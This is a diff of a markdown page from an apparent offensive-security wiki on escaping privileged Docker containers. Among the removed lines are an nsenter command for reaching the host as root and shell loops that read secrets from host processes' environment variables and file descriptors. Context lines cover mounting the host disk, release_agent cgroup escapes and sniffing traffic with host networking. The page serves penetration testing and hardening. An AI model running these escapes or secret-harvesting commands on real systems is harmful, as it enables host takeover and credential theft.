@@ -80,27 +80,9 @@ The `--privileged` flag introduces significant security concerns, and the exploi
 [docker-privileged.md](docker-privileged.md)
 {% endcontent-ref %}
 
-### Privileged + hostPID
+### Mounting Disk
 
-With these permissions you can just **move to the namespace of a process running in the host as root** like init (pid:1) just running: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
-
-Test it in a container executing:
-
-```bash
-docker run --rm -it --pid=host --privileged ubuntu bash
-```
-
-### Privileged
-
-Just with the privileged flag you can try to **access the host's disk** or try to **escape abusing release\_agent or other escapes**.
-
-Test the following bypasses in a container executing:
-
-```bash
-docker run --rm -it --privileged ubuntu bash
-```
-
-#### Mounting Disk - Poc1
+#### Poc1
 
 Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag `--privileged` or `--device=/dev/sda1` with caps is specified, it is possible to get the privileges to see the host drive.
 
@@ -115,7 +97,7 @@ mount /dev/sda1 /mnt/hola
 
 And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola` folder.
 
-#### Mounting Disk - Poc2
+#### Poc2
 
 Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:
 
@@ -140,7 +122,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 debugfs /dev/sda1
 ```
 
-#### Privileged Escape Abusing release\_agent - PoC1
+### Abusing release\_agent
 
 {% code title="Initial PoC" %}
 ```bash
@@ -178,7 +160,7 @@ cat /o
 ```
 {% endcode %}
 
-#### Privileged Escape Abusing release\_agent - PoC2
+The following is a different version, more readable, of the previous script:
 
 {% code title="Second PoC" %}
 ```bash
@@ -230,7 +212,20 @@ Find an **explanation of the technique** in:
 [docker-release\_agent-cgroups-escape.md](docker-breakout-privilege-escalation/docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
 
-#### Privileged Escape Abusing release\_agent without known the relative path - PoC3
+&#x20;`--privileged` **provides far more permissions** than needed to escape a docker container via this method. In reality, the “only” requirements are:
+
+1. We must be **running as root** inside the container
+2. The container must be run with the **`SYS_ADMIN` Linux capability**
+3. The container must lack an AppArmor profile, or otherwise allow the `mount` syscall
+4. The cgroup v1 virtual filesystem must be mounted read-write inside the container
+
+The `SYS_ADMIN` capability allows a container to perform the mount syscall (see [man 7 capabilities](https://linux.die.net/man/7/capabilities)). [Docker starts containers with a restricted set of capabilities](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) by default and does not enable the `SYS_ADMIN` capability due to the security risks of doing so.
+
+Further, Docker [starts containers with the `docker-default` AppArmor](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) policy by default, which [prevents the use of the mount syscall](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) even when the container is run with `SYS_ADMIN`.
+
+A container would be vulnerable to this technique if run with the flags: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`
+
+### Abusing release\_agents without knowing relative path
 
 In the previous exploits the **absolute path of the continer inside the hosts filesystem is disclosed**. However, this isn’t always the case. In cases where you **don’t know the absolute path of the continer inside the host** you can use this technique:
 
@@ -328,7 +323,7 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
 
-#### Privileged Escape Abusing Sensitive Mounts
+### Sensitive Mounts
 
 There are several files that might mounted that give **information about the underlaying host**. Some of them may even indicate **something to be executed by the host when something happens** (which will allow a attacker to escape from the container).\
 The abuse of these files may allow that:
@@ -345,82 +340,16 @@ However, you can find **other sensitive files** to check for in this page:
 [sensitive-mounts.md](docker-breakout-privilege-escalation/sensitive-mounts.md)
 {% endcontent-ref %}
 
-### Arbitrary Mounts
-
-In several occasions you will find that the **container has some volume mounted from the host**. If this volume wasn’t correctly configured you might be able to **access/modify sensitive data**: Read secrets, change ssh authorized\_keys…
-
-```bash
-docker run --rm -it -v /:/host ubuntu bash
-```
-
-### hostPID
-
-If you can access the processes of the host you are going to be able to access a lot of sensitive information stored in those processes. Run test lab:
-
-```
-docker run --rm -it --pid=host ubuntu bash
-```
-
-For example, you will be able to list the processes using something like `ps auxn` and search for sensitive details in the commands.
-
-Then, as you can **access each process of the host in /proc/ you can just steal their env secrets** running:
-
-```bash
-for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
-/proc/988058/environ
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-HOSTNAME=argocd-server-69678b4f65-6mmql
-USER=abrgocd
-...
-```
-
-You can also **access other processes file descriptors and read their open files**:
-
-```bash
-for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
-less fds.txt
-...omitted for brevity...
-lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
-lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
-# You can open the secret filw with:
-cat /proc/635813/fd/4
-```
-
-You can also **kill processes and cause a DoS**.
-
-### hostNetwork
-
-```
-docker run --rm -it --network=host ubuntu bash
-```
+### Host Networking
 
 If a container was configured with the Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), that container's network stack is not isolated from the Docker host (the container shares the host's networking namespace), and the container does not get its own IP-address allocated. In other words, the **container binds all services directly to the host's IP**. Furthermore the container can **intercept ALL network traffic that the host** is sending and receiving on shared interface `tcpdump -i eth0`.
 
 For instance, you can use this to **sniff and even spoof traffic** between host and metadata instance.
 
-Like in the following examples:
+Example:
 
 * [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 * [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
-
-You will be able also to access **network services binded to localhost** inside the host or even access the **metadata permissions of the node** (which might be different those a container can access):
-
-{% content-ref url="../../../cloud-security/pentesting-kubernetes/kubernetes-access-to-other-clouds.md" %}
-[kubernetes-access-to-other-clouds.md](../../../cloud-security/pentesting-kubernetes/kubernetes-access-to-other-clouds.md)
-{% endcontent-ref %}
-
-### hostIPC
-
-```
-docker run --rm -it --ipc=host ubuntu bash
-```
-
-If you only have `hostIPC=true`, you most likely can't do much. If any process on the host or any processes within another pod is using the host’s **inter-process communication mechanisms** (shared memory, semaphore arrays, message queues, etc.), you'll be able to read/write to those same mechanisms. The first place you'll want to look is `/dev/shm`, as it is shared between any pod with `hostIPC=true` and the host. You'll also want to check out the other IPC mechanisms with `ipcs`.
-
-* **Inspect /dev/shm** - Look for any files in this shared memory location: `ls -la /dev/shm`
-* **Inspect existing IPC facilities** – You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. Check it with: `ipcs -a`
-
-## CVEs
 
 ### Runc exploit (CVE-2019-5736)
 
@@ -439,11 +368,9 @@ For more information: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape
 There are other CVEs the container can be vulnerable too, you can find a list in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
 {% endhint %}
 
-## Breakout Templates
-
 ### Container Breakout through Usermode helper Template
 
-If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):
+If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions:
 
 * Find the **path of the containers filesystem** inside the host
   * You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
@@ -461,4 +388,3 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
-* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)
